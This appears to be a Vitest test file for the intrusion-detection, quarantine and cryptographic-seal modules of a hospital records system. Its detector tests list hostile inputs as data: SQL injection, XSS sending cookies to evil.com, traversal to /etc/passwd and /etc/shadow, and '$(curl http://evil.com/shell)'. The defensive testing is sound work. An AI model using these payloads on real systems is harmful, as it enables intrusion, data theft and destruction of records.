import { describe, it, expect, afterAll } from 'vitest';
import { inspectPayload, isIpQuarantined, quarantineIp, pardonQuarantinedIp, calculateDynamicDefcon } from '../military-sentinel';
import { sqlite } from '@/db';
import {
  generateLabReportSeal,
  generateEmarDoseSeal,
  generateHandoverSeal,
  runMilitaryFleetIntegritySweep,
} from '../military-crypto';
import {
  runFipsKnownAnswerTests,
  secureWipeBuffer,
  withSecureBuffer,
  getUserClearance,
  canReadClassification,
  requestTwoPersonAction,
  authorizeTwoPersonAction,
  consumeTwoPersonTicket,
  enterCitadelMode,
  exitCitadelMode,
  isCitadelModeActive,
  generateRuntimeAttestationManifest,
} from '../military-fips';


describe('Military Threat Sentinel & IDS Heuristics', () => {
  it('detects SQL Injection attack payloads with high severity score', () => {
    const payloads = [
      "' UNION SELECT null, username, password FROM users --",
      "1; DROP TABLE patients; --",
      "admin' OR 1=1 --",
      "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
      "WAITFOR DELAY '0:0:5'",
    ];

    for (const p of payloads) {
      const result = inspectPayload(p);
      expect(result.isMalicious).toBe(true);
      expect(result.threatType).toBe('SQL_INJECTION');
      expect(result.threatScore).toBeGreaterThanOrEqual(80);
    }
  });

  it('detects Cross-Site Scripting (XSS) attack payloads', () => {
    const payloads = [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert(document.cookie)>",
      "javascript:fetch('//evil.com/?c='+document.cookie)",
      "<iframe src=\"javascript:alert(1)\"></iframe>",
    ];

    for (const p of payloads) {
      const result = inspectPayload(p);
      expect(result.isMalicious).toBe(true);
      expect(result.threatType).toBe('XSS_ATTEMPT');
    }
  });

  it('detects Path Traversal and Local File Inclusion attempts', () => {
    const payloads = [
      "../../../../etc/passwd",
      "..\\..\\boot.ini",
      "%2e%2e%2f%2e%2e%2fetc%2fshadow",
      "/proc/self/environ",
    ];

    for (const p of payloads) {
      const result = inspectPayload(p);
      expect(result.isMalicious).toBe(true);
      expect(result.threatType).toBe('PATH_TRAVERSAL');
    }
  });

  it('detects Remote Code Execution / Shell Injection attempts', () => {
    const payloads = [
      "; cat /etc/passwd",
      "| whoami",
      "`id`",
      "$(curl http://evil.com/shell)",
    ];

    for (const p of payloads) {
      const result = inspectPayload(p);
      expect(result.isMalicious).toBe(true);
      expect(result.threatType).toBe('COMMAND_INJECTION');
    }
  });

  it('detects honey-token and canary tripwires', () => {
    const result = inspectPayload('/api/admin/dump?admin_debug_override=true');
    expect(result.isMalicious).toBe(true);
    expect(result.threatType).toBe('CANARY_TRIP');
    expect(result.threatScore).toBe(100);
  });

  it('passes benign normal clinical text without false positives', () => {
    const cleanInputs = [
      "Patient reports fever, non-productive cough, and mild headache for 3 days.",
      "Tab. Paracetamol 650mg TDS x 5 days, Syr. Ambroxol 5ml BD.",
      "Chest X-Ray reveals clear bilateral lung fields, normal cardiothoracic ratio.",
      "Follow up after 7 days or report immediately if SpO2 drops below 94%.",
    ];

    for (const text of cleanInputs) {
      const result = inspectPayload(text);
      expect(result.isMalicious).toBe(false);
      expect(result.threatScore).toBe(0);
    }
  });
});

describe('Automated IP Quarantine & Pardon Subsystem', () => {
  const testIp = '198.51.100.99';

  afterAll(() => {
    try {
      sqlite.prepare('DELETE FROM quarantined_ips WHERE ip_address = ?').run(testIp);
      sqlite.prepare('DELETE FROM security_alerts WHERE ip_address = ?').run(testIp);
    } catch {}
  });

  it('quarantines an attacker IP and confirms active quarantine', async () => {
    await quarantineIp(testIp, 'Simulated SQL Injection from test harness');
    const status = isIpQuarantined(testIp);
    expect(status.quarantined).toBe(true);
    expect(status.reason).toContain('Simulated SQL Injection');
  });

  it('pardons a quarantined IP and verifies release', async () => {
    await pardonQuarantinedIp(testIp, 'Test Harness Admin');
    const status = isIpQuarantined(testIp);
    expect(status.quarantined).toBe(false);
  });
});

describe('DEFCON Dynamic Threat Matrix', () => {
  it('computes a valid DEFCON threat status structure', () => {
    const status = calculateDynamicDefcon();
    expect(status.level).toBeGreaterThanOrEqual(1);
    expect(status.level).toBeLessThanOrEqual(5);
    expect(status.title).toBeDefined();
    expect(typeof status.threatScore).toBe('number');
    expect(Array.isArray(status.indicators)).toBe(true);
    expect(status.recommendation).toBeDefined();
  });
});

describe('Military-Grade Cryptographic Digital Seals', () => {
  it('computes deterministic, tamper-evident seals for lab reports', () => {
    const reportData = {
      id: 42,
      reportNo: 'LR-2026-0042',
      testName: 'Complete Blood Count (CBC)',
      results: JSON.stringify([{ parameter: 'Hemoglobin', value: '14.2', unit: 'g/dL', flag: 'NORMAL' }]),
      status: 'COMPLETED',
      technicianName: 'Ramesh Kumar',
      reportedAt: new Date('2026-09-30T10:00:00Z'),
    };

    const seal1 = generateLabReportSeal(reportData);
    const seal2 = generateLabReportSeal(reportData);
    expect(seal1).toBe(seal2);
    expect(seal1).toHaveLength(64); // SHA-256 hex string

    // Any alteration produces different seal
    const tamperedData = { ...reportData, results: JSON.stringify([{ parameter: 'Hemoglobin', value: '7.1', unit: 'g/dL', flag: 'CRITICAL' }]) };
    const tamperedSeal = generateLabReportSeal(tamperedData);
    expect(seal1).not.toBe(tamperedSeal);
  });

  it('computes deterministic, tamper-evident seals for eMAR doses', () => {
    const doseData = {
      id: 108,
      admissionId: 12,
      medicationName: 'Inj. Ceftriaxone 1g IV',
      dosage: '1g IV in 100ml NS',
      status: 'GIVEN',
      nurseName: 'Sister Priya Nair',
      prescribedBy: 'Dr. Nitin Sonare',
      scheduledTime: new Date('2026-09-30T08:00:00Z'),
      administeredAt: new Date('2026-09-30T08:05:00Z'),
    };

    const seal1 = generateEmarDoseSeal(doseData);
    const seal2 = generateEmarDoseSeal(doseData);
    expect(seal1).toBe(seal2);
    expect(seal1).toHaveLength(64);

    const tamperedData = { ...doseData, nurseName: 'Attacker Impersonator' };
    const tamperedSeal = generateEmarDoseSeal(tamperedData);
    expect(seal1).not.toBe(tamperedSeal);
  });

  it('computes deterministic, tamper-evident seals for IPD handovers', () => {
    const handoverData = {
      id: 5,
      admissionId: 12,
      handoverType: 'DOCTOR_ROUND',
      shift: 'Day Round',
      outgoingStaffName: 'Dr. Rajesh Sharma',
      incomingStaffName: 'Dr. Nitin Sonare',
      patientCondition: 'Improving',
      summaryNotes: 'Post-op Day 2, afebrile, vitals stable.',
      activeTreatmentOrders: 'Continue IV antibiotics, step down to oral fluids',
    };

    const seal1 = generateHandoverSeal(handoverData);
    const seal2 = generateHandoverSeal(handoverData);
    expect(seal1).toBe(seal2);
    expect(seal1).toHaveLength(64);

    const tamperedData = { ...handoverData, patientCondition: 'Critical' };
    const tamperedSeal = generateHandoverSeal(tamperedData);
    expect(seal1).not.toBe(tamperedSeal);
  });

  it('runs a full fleet-wide cryptographic sweep returning valid partition report including medical certificates', async () => {
    const report = await runMilitaryFleetIntegritySweep();
    expect(report.sweepCompletedAt).toBeDefined();
    expect(typeof report.overallIntact).toBe('boolean');
    expect(typeof report.totalArtifactsChecked).toBe('number');
    expect(Array.isArray(report.sections)).toBe(true);
    expect(report.chainRootHash).toBeDefined();
    expect(report.sections.some((s) => s.artifactType === 'MEDICAL_CERTIFICATE')).toBe(true);
  });

  it('validates state-secret POSIX 0600 file security permissions on storage at rest', () => {
    const fs = require('fs');
    const path = require('path');
    const dbPath = path.resolve(process.cwd(), 'sqlite.db');

    if (fs.existsSync(dbPath)) {
      const stats = fs.statSync(dbPath);
      const mode = stats.mode & 0o777;
      // In state-secret arrangement, file permissions must be 0600 (read/write only by process owner)
      expect(mode).toBe(0o600);
    }
  });
});

describe('Military FIPS 140-3 Cryptographic Self-Tests & Multi-Level Security', () => {
  it('executes FIPS 140-3 Known Answer Tests (KAT) with 100% bitwise fidelity', () => {
    const res = runFipsKnownAnswerTests(true);
    expect(res.passed).toBe(true);
    expect(res.sha256KatPassed).toBe(true);
    expect(res.hmacSha256KatPassed).toBe(true);
    expect(res.aes256GcmKatPassed).toBe(true);
    expect(res.scryptKatPassed).toBe(true);
    expect(res.crngHealthTestPassed).toBe(true);
    expect(res.details.length).toBe(5);
  });

  it('securely zeroizes memory buffers in compliance with DoD 5220.22-M', () => {
    const sensitive = Buffer.from('TOP_SECRET_MILITARY_ENCRYPTION_KEY_2026', 'utf8');
    expect(sensitive.toString('utf8')).toContain('TOP_SECRET');
    secureWipeBuffer(sensitive);
    expect(sensitive.toString('utf8')).not.toContain('TOP_SECRET');
    expect(sensitive.every((b) => b === 0)).toBe(true);
  });

  it('guarantees in-memory zeroization via withSecureBuffer wrapper', () => {
    let capturedBuffer: Buffer | null = null;
    const result = withSecureBuffer(32, (buf) => {
      buf.fill(0xaa);
      capturedBuffer = buf;
      return buf.toString('hex');
    });
    expect(result).toHaveLength(64);
    expect(capturedBuffer).not.toBeNull();
    // Buffer must be wiped to 0x00 after callback completion
    expect((capturedBuffer as unknown as Buffer).every((b) => b === 0)).toBe(true);
  });

  it('enforces Multi-Level Security (MLS) and Bell-LaPadula Simple Security Property', () => {
    // Admin Doctor has TOP_SECRET clearance
    expect(getUserClearance('admin_doctor')).toBe('TOP_SECRET');
    expect(canReadClassification('admin_doctor', 'TOP_SECRET')).toBe(true);
    expect(canReadClassification('admin_doctor', 'SECRET')).toBe(true);
    expect(canReadClassification('admin_doctor', 'CONFIDENTIAL')).toBe(true);

    // Doctor has SECRET clearance
    expect(getUserClearance('doctor')).toBe('SECRET');
    expect(canReadClassification('doctor', 'SECRET')).toBe(true);
    expect(canReadClassification('doctor', 'TOP_SECRET')).toBe(false); // No Read Up!

    // Receptionist has UNCLASSIFIED clearance
    expect(getUserClearance('receptionist')).toBe('UNCLASSIFIED');
    expect(canReadClassification('receptionist', 'CONFIDENTIAL')).toBe(false); // No Read Up!
    expect(canReadClassification('receptionist', 'SECRET')).toBe(false);
  });

  it('enforces Two-Person Integrity (TPI) dual-control quorum lifecycle', () => {
    const { ticketId } = requestTwoPersonAction(
      1,
      'admin_doctor',
      'ZEROIZE_DATABASE',
      'Emergency cryptographic memory shredding requested'
    );

    // Rule of Two: Initiator cannot authorize their own action
    const selfAuth = authorizeTwoPersonAction(ticketId, 1, 'admin_doctor');
    expect(selfAuth.success).toBe(false);
    expect(selfAuth.error).toContain('Two-Person Integrity violation');

    // Low-privilege staff cannot authorize strategic action
    const nurseAuth = authorizeTwoPersonAction(ticketId, 3, 'nurse');
    expect(nurseAuth.success).toBe(false);
    expect(nurseAuth.error).toContain('Insufficient clearance');

    // Secondary distinct Doctor authorizes
    const docAuth = authorizeTwoPersonAction(ticketId, 2, 'doctor');
    expect(docAuth.success).toBe(true);

    // Consume ticket
    const consumed = consumeTwoPersonTicket(ticketId);
    expect(consumed).toBe(true);

    // Double consumption rejected
    expect(consumeTwoPersonTicket(ticketId)).toBe(false);
  });

  it('activates and deactivates Citadel Defense Mode', () => {
    expect(isCitadelModeActive()).toBe(false);
    enterCitadelMode('Simulated active DEFCON 1 breach containment');
    expect(isCitadelModeActive()).toBe(true);
    exitCitadelMode();
    expect(isCitadelModeActive()).toBe(false);
  });

  it('generates cryptographic runtime attestation manifest over core modules', () => {
    const manifest = generateRuntimeAttestationManifest();
    expect(manifest.allIntact).toBe(true);
    expect(manifest.totalFilesAttested).toBeGreaterThanOrEqual(7);
    expect(manifest.manifestHash).toHaveLength(64);
  });
});

